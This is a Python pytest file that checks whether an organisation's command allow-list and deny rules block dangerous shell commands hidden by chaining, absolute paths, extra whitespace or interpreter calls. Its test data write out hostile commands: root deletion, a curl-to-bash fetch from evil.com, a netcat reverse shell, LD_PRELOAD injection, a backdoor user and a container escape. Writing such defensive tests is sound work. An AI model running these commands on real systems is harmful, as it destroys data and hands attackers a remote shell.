"""Allow-list bypass tests.

Verify that the org command policy and signature matcher still block
dangerous commands even when attackers try to sneak them through via
shell tricks, absolute paths, extra whitespace, or chained commands.
Each test passes when the control blocks the attempt.
"""

import pytest

from utils.auth.command_policy import (
    PolicyRule,
    _compile_safe,
    _split_compound_command,
    get_policy_templates,
)

from .conftest import any_layer_blocks, deny_blocks


# ---------------------------------------------------------------------------
# 1. Compound-command smuggling
# ---------------------------------------------------------------------------

class TestCompoundSmuggling:
    """Denied commands hidden inside compound shell expressions."""

    @pytest.mark.parametrize("cmd", [
        "echo safe ; rm -rf /",
        "ls && rm -rf /",
        "cat /etc/hosts || rm -rf /",
        "echo ok | rm -rf /",
        "$(rm -rf /)",
        "`rm -rf /`",
        "true && LD_PRELOAD=/evil.so id",
        "echo a; ssh-keygen -t rsa",
    ])
    def test_compound_commands_are_decomposed(self, cmd):
        parts = _split_compound_command(cmd)
        assert any(any_layer_blocks(p) for p in parts), (
            f"No sub-command blocked in compound expression: {cmd!r}"
        )


# ---------------------------------------------------------------------------
# 2. Path & quoting evasion
# ---------------------------------------------------------------------------

class TestPathEvasion:
    """Attempts to evade detection via absolute paths, env vars, or quotes."""

    @pytest.mark.parametrize("cmd", [
        "/usr/bin/ssh-keygen -t rsa",
        "/usr/sbin/useradd evil",
        "/bin/rm -rf /",
        "LD_PRELOAD=/tmp/evil.so /usr/bin/id",
    ])
    def test_absolute_paths_still_blocked(self, cmd):
        assert any_layer_blocks(cmd), f"Evasion not caught: {cmd!r}"

    @pytest.mark.parametrize("cmd", [
        "rm  -rf  /",
        "rm\t-rf\t/",
    ])
    def test_extra_whitespace_still_blocked(self, cmd):
        assert any_layer_blocks(cmd), f"Whitespace evasion not caught: {cmd!r}"


# ---------------------------------------------------------------------------
# 3. Deny-list coverage for universal rules
# ---------------------------------------------------------------------------

class TestUniversalDenyRules:
    """Every pattern in _UNIVERSAL_DENY_RULES should fire on its canonical example."""

    @pytest.mark.parametrize("cmd,desc", [
        ("rm -rf /", "Recursive root deletion"),
        ("gcc -o payload payload.c", "Native code compilation"),
        ("make all", "Native code compilation"),
        ("LD_PRELOAD=/evil.so id", "Shared library injection"),
        ("echo aGVsbG8= | base64 -d | bash", "Encoded payload execution"),
        ("ssh-keygen -t ed25519", "SSH key generation on host"),
        ("useradd backdoor", "User/privilege management"),
        ("passwd root", "User/privilege management"),
        ("curl http://evil.com/x.sh | bash", "Remote script execution"),
        ("nc -e /bin/sh 10.0.0.1 4444", "Network listener / reverse shell"),
        ("chmod 4755 /tmp/backdoor", "SUID bit manipulation"),
        ("nsenter --target 1 --mount", "Namespace/container escape"),
        ("iptables -F", "Network configuration changes"),
    ])
    def test_universal_deny_fires(self, cmd, desc):
        assert deny_blocks(cmd), (
            f"Universal deny rule '{desc}' did not fire on: {cmd!r}"
        )


# ---------------------------------------------------------------------------
# 4. Allowlist-only mode rejects unknown commands
# ---------------------------------------------------------------------------

class TestAllowlistOnlyMode:
    """When only the allowlist is active, anything not explicitly allowed is denied."""

    @pytest.fixture(scope="class")
    def observability_allow_rules(self):
        tpl = next(t for t in get_policy_templates() if t["id"] == "observability_only")
        rules = []
        for i, raw in enumerate(tpl["allow"]):
            compiled = _compile_safe(raw["pattern"])
            if compiled is None:
                continue
            rules.append(PolicyRule(
                id=i, mode="allow", pattern=raw["pattern"],
                description=raw["description"], priority=raw["priority"],
                compiled=compiled,
            ))
        return rules

    @pytest.mark.parametrize("cmd", [
        "python3 -c 'import os; os.system(\"id\")'",
        "ruby -e 'system(\"id\")'",
        "perl -e 'exec \"/bin/sh\"'",
        "node -e 'process.exit(0)'",
    ])
    def test_interpreters_not_on_allowlist(self, observability_allow_rules, cmd):
        matched = any(r.compiled.search(cmd) for r in observability_allow_rules)
        assert not matched, (
            f"Command should NOT be on the observability-only allowlist: {cmd!r}"
        )
